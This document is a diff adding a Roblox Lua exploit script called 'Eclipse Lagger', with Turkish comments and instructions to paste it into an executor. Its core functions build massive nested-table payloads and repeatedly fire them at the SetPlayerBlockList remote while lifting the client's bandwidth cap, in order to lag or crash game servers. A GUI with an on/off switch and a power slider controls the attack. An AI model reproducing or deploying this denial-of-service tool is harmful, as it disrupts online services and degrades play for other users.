@@ -1,1 +1,377 @@
+-- ============================================================
+-- ECLIPSE LAGGER — Bağımsız Loader
+-- Kullanım: Executor'a yapıştır, çalıştır. Panel açılır.
+-- ============================================================
 
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+
+-- Eski GUI'yi temizle (çift çalıştırmada çakışma olmasın)
+local old = playerGui:FindFirstChild("CrystalLaggerGUI")
+if old then old:Destroy() end
+
+-- Ayarlar
+local LAGGER_CONFIG = {
+    TableIncrease = 270,
+    Tries = 1,
+    LoopWaitTime = 0.3,
+    LowEndTableIncrease = 265,
+    LowEndLoopWaitTime = 0.8,
+}
+local LAGGER_POWER_MAX = 290
+local laggerStates = { Main = false, LowEnd = false }
+local lagThreads = { Main = nil, LowEnd = nil }
+local cachedBombAmount, cachedBombPayload = nil, nil
+
+local function buildBombPayload(amt)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for _ = 1, amt do
+        local t = {}
+        table.insert(z, t)
+        z = t
+    end
+    local max = math.min(499999 / (amt + 2), 1500)
+    for _ = 1, max do table.insert(main, spam) end
+    return main
+end
+
+local function bomb(amt)
+    if cachedBombAmount ~= amt or not cachedBombPayload then
+        cachedBombAmount = amt
+        cachedBombPayload = buildBombPayload(amt)
+    end
+    pcall(function()
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(cachedBombPayload)
+    end)
+end
+
+local function startMainLag()
+    if lagThreads.Main then return end
+    lagThreads.Main = task.spawn(function()
+        while laggerStates.Main do
+            pcall(function()
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+            end)
+            bomb(LAGGER_CONFIG.TableIncrease)
+            task.wait(LAGGER_CONFIG.LoopWaitTime)
+        end
+    end)
+end
+
+local function stopMainLag()
+    laggerStates.Main = false
+    if lagThreads.Main then
+        pcall(task.cancel, lagThreads.Main)
+        lagThreads.Main = nil
+    end
+    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
+end
+
+local function toggleMainLagger()
+    laggerStates.Main = not laggerStates.Main
+    if laggerStates.Main then
+        startMainLag()
+    else
+        stopMainLag()
+    end
+    return laggerStates.Main
+end
+
+-- Ayarları yükle/kaydet
+local SETTINGS_FILE = "CrystalLagger_Settings.json"
+local function fileOk()
+    return typeof(writefile) == "function" and typeof(readfile) == "function" and typeof(isfile) == "function"
+end
+local function loadSettings()
+    if not fileOk() then return nil end
+    local ok, res = pcall(function()
+        if isfile(SETTINGS_FILE) then return HttpService:JSONDecode(readfile(SETTINGS_FILE)) end
+    end)
+    return ok and res or nil
+end
+local function saveSettings(data)
+    if not fileOk() then return end
+    pcall(function() writefile(SETTINGS_FILE, HttpService:JSONEncode(data)) end)
+end
+
+-- Arka plan
+local LAGGER_BACKGROUND_FALLBACK = "rbxassetid://94763047376005"
+local function resolveBackground()
+    local loader = nil
+    pcall(function()
+        loader = (typeof(getcustomasset) == "function" and getcustomasset)
+            or (typeof(getsynasset) == "function" and getsynasset)
+    end)
+    if not loader or not fileOk() then return LAGGER_BACKGROUND_FALLBACK end
+    local file = "CrystalLagger_bg.png"
+    local url = "https://files.catbox.moe/ug6eug.png"
+    local has = false
+    pcall(function() has = isfile(file) end)
+    if not has then
+        local ok, data = pcall(function() return game:HttpGet(url) end)
+        if not ok or type(data) ~= "string" or data:sub(1,8) ~= "\137PNG\r\n\26\n" then
+            return LAGGER_BACKGROUND_FALLBACK
+        end
+        if not pcall(writefile, file, data) then return LAGGER_BACKGROUND_FALLBACK end
+    end
+    local ok, asset = pcall(loader, file)
+    if ok and type(asset) == "string" and asset ~= "" then return asset end
+    return LAGGER_BACKGROUND_FALLBACK
+end
+
+-- GUI oluştur
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CrystalLaggerGUI"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.fromOffset(270, 116)
+mainFrame.Position = UDim2.new(0.5, -135, 0.5, -58)
+mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Active = true
+mainFrame.Visible = true
+mainFrame.Parent = screenGui
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)
+
+local bgImage = Instance.new("ImageLabel")
+bgImage.Size = UDim2.new(1, 0, 1, 0)
+bgImage.BackgroundTransparency = 1
+bgImage.Image = resolveBackground()
+bgImage.ScaleType = Enum.ScaleType.Crop
+bgImage.ZIndex = 0
+bgImage.Parent = mainFrame
+Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 16)
+
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, -12, 0, 30)
+header.Position = UDim2.fromOffset(6, 6)
+header.BackgroundTransparency = 1
+header.ZIndex = 2
+header.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.fromOffset(200, 26)
+title.Position = UDim2.new(0.5, -100, 0, 3)
+title.BackgroundTransparency = 1
+title.Text = "ECLIPSE LAGGER"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 16
+title.Font = Enum.Font.GothamBlack
+title.ZIndex = 3
+title.Parent = header
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.fromOffset(20, 20)
+closeBtn.Position = UDim2.new(1, -20, 0, 0)
+closeBtn.BackgroundTransparency = 1
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextSize = 14
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.ZIndex = 3
+closeBtn.Parent = header
+
+local controlFrame = Instance.new("Frame")
+controlFrame.Size = UDim2.new(1, -12, 0, 35)
+controlFrame.Position = UDim2.fromOffset(6, 73)
+controlFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+controlFrame.BackgroundTransparency = 0.5
+controlFrame.BorderSizePixel = 0
+controlFrame.ZIndex = 2
+controlFrame.Parent = mainFrame
+Instance.new("UICorner", controlFrame).CornerRadius = UDim.new(0, 10)
+
+local toggleLabel = Instance.new("TextLabel")
+toggleLabel.Size = UDim2.fromScale(1, 1)
+toggleLabel.BackgroundTransparency = 1
+toggleLabel.Text = "LAGGER: OFF"
+toggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleLabel.TextSize = 10
+toggleLabel.Font = Enum.Font.GothamBold
+toggleLabel.ZIndex = 3
+toggleLabel.Parent = controlFrame
+
+local switchBg = Instance.new("Frame")
+switchBg.Size = UDim2.fromOffset(32, 18)
+switchBg.Position = UDim2.new(1, -38, 0.5, -9)
+switchBg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+switchBg.BorderSizePixel = 0
+switchBg.ZIndex = 3
+switchBg.Parent = controlFrame
+Instance.new("UICorner", switchBg).CornerRadius = UDim.new(1, 0)
+
+local knob = Instance.new("Frame")
+knob.Size = UDim2.fromOffset(12, 12)
+knob.Position = UDim2.new(0, 3, 0.5, -6)
+knob.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+knob.BorderSizePixel = 0
+knob.ZIndex = 4
+knob.Parent = switchBg
+Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.BackgroundTransparency = 1
+toggleBtn.Text = ""
+toggleBtn.Position = UDim2.fromOffset(44, 0)
+toggleBtn.Size = UDim2.new(1, -44, 1, 0)
+toggleBtn.ZIndex = 5
+toggleBtn.Parent = controlFrame
+
+local powerFrame = Instance.new("Frame")
+powerFrame.Size = UDim2.new(1, -12, 0, 43)
+powerFrame.Position = UDim2.fromOffset(6, 80)
+powerFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+powerFrame.BackgroundTransparency = 0.5
+powerFrame.BorderSizePixel = 0
+powerFrame.ZIndex = 2
+powerFrame.Parent = mainFrame
+powerFrame.Visible = false
+Instance.new("UICorner", powerFrame).CornerRadius = UDim.new(0, 10)
+
+local powerLabel = Instance.new("TextLabel")
+powerLabel.Size = UDim2.new(1, -12, 0, 16)
+powerLabel.Position = UDim2.fromOffset(6, 2)
+powerLabel.BackgroundTransparency = 1
+powerLabel.Text = "POWER: " .. LAGGER_CONFIG.TableIncrease
+powerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+powerLabel.TextSize = 10
+powerLabel.Font = Enum.Font.GothamBold
+powerLabel.TextXAlignment = Enum.TextXAlignment.Left
+powerLabel.ZIndex = 3
+powerLabel.Parent = powerFrame
+
+local powerBar = Instance.new("Frame")
+powerBar.Size = UDim2.new(1, -12, 0, 8)
+powerBar.Position = UDim2.new(0, 6, 1, -15)
+powerBar.BackgroundColor3 = Color3.fromRGB(42, 42, 48)
+powerBar.BorderSizePixel = 0
+powerBar.ZIndex = 3
+powerBar.Parent = powerFrame
+Instance.new("UICorner", powerBar).CornerRadius = UDim.new(1, 0)
+
+local powerFill = Instance.new("Frame")
+powerFill.Size = UDim2.fromScale(LAGGER_CONFIG.TableIncrease / LAGGER_POWER_MAX, 1)
+powerFill.BackgroundColor3 = Color3.fromRGB(235, 240, 245)
+powerFill.BorderSizePixel = 0
+powerFill.ZIndex = 4
+powerFill.Parent = powerBar
+Instance.new("UICorner", powerFill).CornerRadius = UDim.new(1, 0)
+
+local powerKnob = Instance.new("Frame")
+powerKnob.AnchorPoint = Vector2.new(0.5, 0.5)
+powerKnob.Size = UDim2.fromOffset(14, 14)
+powerKnob.Position = UDim2.new(LAGGER_CONFIG.TableIncrease / LAGGER_POWER_MAX, 0, 0.5, 0)
+powerKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+powerKnob.BorderSizePixel = 0
+powerKnob.ZIndex = 5
+powerKnob.Parent = powerBar
+Instance.new("UICorner", powerKnob).CornerRadius = UDim.new(1, 0)
+
+local powerHitbox = Instance.new("TextButton")
+powerHitbox.Size = UDim2.new(1, 12, 0, 24)
+powerHitbox.Position = UDim2.new(0, -6, 0.5, -12)
+powerHitbox.BackgroundTransparency = 1
+powerHitbox.Text = ""
+powerHitbox.ZIndex = 6
+powerHitbox.Parent = powerBar
+
+local dragging = false
+local function setPower(v)
+    v = math.clamp(math.floor(v + 0.5), 0, LAGGER_POWER_MAX)
+    LAGGER_CONFIG.TableIncrease = v
+    local r = v / LAGGER_POWER_MAX
+    powerFill.Size = UDim2.fromScale(r, 1)
+    powerKnob.Position = UDim2.new(r, 0, 0.5, 0)
+    powerLabel.Text = "POWER: " .. v
+    saveSettings({ power = v })
+end
+
+powerHitbox.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        local w = powerBar.AbsoluteSize.X
+        if w > 0 then setPower(math.clamp((i.Position.X - powerBar.AbsolutePosition.X) / w, 0, 1) * LAGGER_POWER_MAX) end
+    end
+end)
+UserInputService.InputChanged:Connect(function(i)
+    if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+        local w = powerBar.AbsoluteSize.X
+        if w > 0 then setPower(math.clamp((i.Position.X - powerBar.AbsolutePosition.X) / w, 0, 1) * LAGGER_POWER_MAX) end
+    end
+end)
+UserInputService.InputEnded:Connect(function(i)
+    if dragging and (i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch) then dragging = false end
+end)
+
+local function updateVisual(on)
+    toggleLabel.Text = on and "LAGGER: ON" or "LAGGER: OFF"
+    TweenService:Create(knob, TweenInfo.new(0.15), {
+        Position = on and UDim2.new(1, -17, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
+    }):Play()
+end
+
+toggleBtn.Activated:Connect(function()
+    local on = toggleMainLagger()
+    updateVisual(on)
+end)
+closeBtn.Activated:Connect(function() screenGui.Enabled = false end)
+
+-- Sürükle
+local drag, dragInput, dragStart, startPos = false, nil, nil, nil
+mainFrame.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+        drag = true; dragInput = i; dragStart = i.Position; startPos = mainFrame.Position
+    end
+end)
+mainFrame.InputChanged:Connect(function(i)
+    if drag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+        dragInput = i
+    end
+end)
+UserInputService.InputChanged:Connect(function(i)
+    if drag and i == dragInput then
+        local d = i.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(i)
+    if drag and (i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch) then drag = false end
+end)
+
+-- Global API (ana script açısından)
+_G.CrystalLagger = {
+    IsEnabled = function() return laggerStates.Main end,
+    SetEnabled = function(v)
+        if laggerStates.Main ~= v then
+            laggerStates.Main = v
+            if v then startMainLag() else stopMainLag() end
+            updateVisual(v)
+        end
+    end,
+    Toggle = function() local on = toggleMainLagger(); updateVisual(on); return on end,
+    SetVisible = function(v) screenGui.Enabled = v end,
+    Stop = function() stopMainLag() end,
+    ResetPosition = function() mainFrame.Position = UDim2.new(0.5, -135, 0.5, -58) end,
+    GetPower = function() return LAGGER_CONFIG.TableIncrease end,
+    SetPower = function(v) setPower(v) end,
+}
+
+-- Kayıtlı ayarı yükle
+local saved = loadSettings()
+if saved and saved.power then setPower(saved.power) end
+
+print("[Eclipse Lagger] Yüklendi. Panel açık.")
